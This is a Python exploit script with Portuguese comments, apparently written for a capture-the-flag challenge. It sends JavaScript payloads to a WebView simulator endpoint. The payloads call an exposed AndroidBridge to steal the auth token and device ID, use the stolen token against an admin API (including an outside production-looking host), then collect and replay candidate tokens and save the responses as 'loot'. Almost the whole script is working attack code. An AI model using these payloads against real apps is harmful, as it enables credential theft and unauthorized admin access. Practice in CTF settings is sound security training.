#!/usr/bin/env python3
import json
import re
import sys
import hashlib
from pathlib import Path

import requests
from urllib3.exceptions import InsecureRequestWarning

# Desativa warning TLS comum em CTF.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET_HOST = "87e6bb1481310f67.chal.ctf.ae"
BASE = f"https://{TARGET_HOST}"

Path("loot").mkdir(exist_ok=True)

# Headers móveis vistos no código Android.
HEADERS = {
    "X-App-Version": "3.7.2",
    "X-Platform": "android",
    "User-Agent": "FluidRealty/3.7.2 Android WebView",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
}

FOUND_TOKENS = set()


def pretty(text):
    """
    Formata JSON se possível.
    """
    try:
        return json.dumps(json.loads(text), indent=2, ensure_ascii=False)
    except Exception:
        return text


def save(label, response):
    """
    Salva resposta completa com nome curto baseado em hash.
    """
    digest = hashlib.sha256(label.encode()).hexdigest()[:12]
    safe = re.sub(r"[^a-zA-Z0-9_.-]+", "_", label)[:70].strip("_")
    path = Path("loot") / f"script5_{safe}_{digest}.txt"

    lines = []
    lines.append(f"LABEL: {label}")
    lines.append(f"URL: {response.url}")
    lines.append(f"STATUS: {response.status_code}")
    lines.append("")
    lines.append("HEADERS:")
    for k, v in response.headers.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    lines.append("BODY:")
    lines.append(pretty(response.text))

    path.write_text("\n".join(lines), encoding="utf-8")
    return path


def extract_strings(obj):
    """
    Extrai strings recursivamente de JSON para procurar token ou flag.
    """
    values = []

    if isinstance(obj, dict):
        for value in obj.values():
            values.extend(extract_strings(value))
    elif isinstance(obj, list):
        for item in obj:
            values.extend(extract_strings(item))
    elif isinstance(obj, str):
        values.append(obj)

    return values


def process_body(body):
    """
    Procura flag e tokens candidatos em qualquer corpo de resposta.
    """
    flag = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)
    if flag:
        value = flag.group(0)
        print()
        print("=" * 100)
        print("[+] FLAG ENCONTRADA")
        print("=" * 100)
        print(value)
        Path("flag.txt").write_text(value + "\n", encoding="utf-8")
        print("[+] Flag salva em flag.txt")
        sys.exit(0)

    candidates = []

    # Tokens por campos comuns.
    token_patterns = [
        r'"token"\s*:\s*"([^"]+)"',
        r'"authToken"\s*:\s*"([^"]+)"',
        r'"auth_token"\s*:\s*"([^"]+)"',
        r'"session_token"\s*:\s*"([^"]+)"',
        r'"access_token"\s*:\s*"([^"]+)"',
        r'"result"\s*:\s*"([^"]+)"',
        r'"output"\s*:\s*"([^"]+)"',
        r'"value"\s*:\s*"([^"]+)"',
        r'Bearer\s+([A-Za-z0-9._~+/=-]+)',
    ]

    for pattern in token_patterns:
        for match in re.finditer(pattern, body, re.IGNORECASE):
            candidates.append(match.group(1).strip())

    # Também tenta extrair strings de JSON inteiro.
    try:
        parsed = json.loads(body)
        candidates.extend(extract_strings(parsed))
    except Exception:
        pass

    # Filtra mensagens óbvias e guarda possíveis tokens.
    bad_words = [
        "missing",
        "usage",
        "error",
        "javascript",
        "androidbridge",
        "webview",
        "loaded",
        "status",
        "bridge",
        "methods",
        "null",
        "undefined",
        "none",
    ]

    for candidate in candidates:
        candidate = candidate.strip()

        if not candidate:
            continue

        lowered = candidate.lower()

        if any(word in lowered for word in bad_words):
            continue

        # Aceita JWT, tokens longos, ou strings com cara de segredo.
        if "." in candidate or len(candidate) >= 12:
            FOUND_TOKENS.add(candidate)


def post_js(label, javascript):
    """
    Envia JavaScript puro para /api/webview/simulate.
    """
    response = requests.post(
        BASE + "/api/webview/simulate",
        headers=HEADERS,
        json={"javascript": javascript},
        timeout=15,
        verify=False,
        allow_redirects=False,
    )

    saved = save(label, response)
    process_body(response.text)

    print()
    print("=" * 100)
    print(label)
    print("=" * 100)
    print(f"Status: {response.status_code}")
    print(f"Tamanho: {len(response.text)} bytes")
    print(f"Salvo em: {saved}")
    print()

    preview = pretty(response.text)
    if len(preview) > 2000:
        preview = preview[:2000] + "\n...[preview cortado, resposta completa salva no loot]"
    print(preview)

    return response


def test_admin_token(token):
    """
    Testa token candidato no endpoint admin real.
    """
    response = requests.get(
        BASE + "/api/properties/admin",
        headers={**HEADERS, "Authorization": f"Bearer {token}"},
        timeout=15,
        verify=False,
        allow_redirects=False,
    )

    saved = save(f"ADMIN TOKEN {token[:50]}", response)
    process_body(response.text)

    print()
    print("=" * 100)
    print(f"ADMIN TOKEN {token[:80]}")
    print("=" * 100)
    print(f"Status: {response.status_code}")
    print(f"Tamanho: {len(response.text)} bytes")
    print(f"Salvo em: {saved}")
    print()
    print(pretty(response.text))


def main():
    print("[*] Script 5: executando JavaScript diretamente no WebView simulator")
    print(f"[*] Target: {BASE}")

    # Payloads síncronos. São os mais prováveis de funcionar se o backend usa eval/execução simples.
    payloads = [
        (
            "JS getAuthToken expression",
            "AndroidBridge.getAuthToken()"
        ),
        (
            "JS getAuthToken IIFE",
            "(() => AndroidBridge.getAuthToken())()"
        ),
        (
            "JS getAuthToken return",
            "return AndroidBridge.getAuthToken();"
        ),
        (
            "JS document body token",
            "document.body.innerText = AndroidBridge.getAuthToken();"
        ),
        (
            "JS all bridge methods JSON",
            "JSON.stringify({token: AndroidBridge.getAuthToken(), device: AndroidBridge.getDeviceId(), version: AndroidBridge.getAppVersion()})"
        ),
        (
            "JS getDeviceId",
            "AndroidBridge.getDeviceId()"
        ),
        (
            "JS getAppVersion",
            "AndroidBridge.getAppVersion()"
        ),
        (
            "JS enumerate AndroidBridge",
            "JSON.stringify(Object.getOwnPropertyNames(AndroidBridge))"
        ),

        # XHR síncrono usando token da bridge contra o endpoint admin.
        (
            "JS sync XHR admin api.fluidrealty.co",
            """
            (() => {
              var token = AndroidBridge.getAuthToken();
              var xhr = new XMLHttpRequest();
              xhr.open("GET", "https://api.fluidrealty.co/api/properties/admin", false);
              xhr.setRequestHeader("Authorization", "Bearer " + token);
              xhr.send(null);
              return xhr.responseText;
            })()
            """
        ),
        (
            "JS sync XHR admin challenge host",
            f"""
            (() => {{
              var token = AndroidBridge.getAuthToken();
              var xhr = new XMLHttpRequest();
              xhr.open("GET", "{BASE}/api/properties/admin", false);
              xhr.setRequestHeader("Authorization", "Bearer " + token);
              xhr.send(null);
              return xhr.responseText;
            }})()
            """
        ),

        # Fetch assíncrono, caso o simulador suporte promise.
        (
            "JS fetch admin api.fluidrealty.co",
            """
            fetch("https://api.fluidrealty.co/api/properties/admin", {
              headers: {"Authorization": "Bearer " + AndroidBridge.getAuthToken()}
            }).then(r => r.text()).then(t => t)
            """
        ),
        (
            "JS fetch admin challenge host",
            f"""
            fetch("{BASE}/api/properties/admin", {{
              headers: {{"Authorization": "Bearer " + AndroidBridge.getAuthToken()}}
            }}).then(r => r.text()).then(t => t)
            """
        ),
    ]

    for label, javascript in payloads:
        post_js(label, javascript)

    print()
    print("=" * 100)
    print("[*] Tokens candidatos extraídos")
    print("=" * 100)

    if not FOUND_TOKENS:
        print("[-] Nenhum token extraído automaticamente.")
    else:
        for token in sorted(FOUND_TOKENS):
            print(token)

        print()
        print("=" * 100)
        print("[*] Testando tokens no endpoint admin")
        print("=" * 100)

        for token in sorted(FOUND_TOKENS):
            test_admin_token(token)

    print()
    print("=" * 100)
    print("REVISÃO")
    print("=" * 100)
    print("grep -RniE 'flag|token|result|output|admin|private|error|exception' loot/script5_*.txt")

if __name__ == "__main__":
    main()
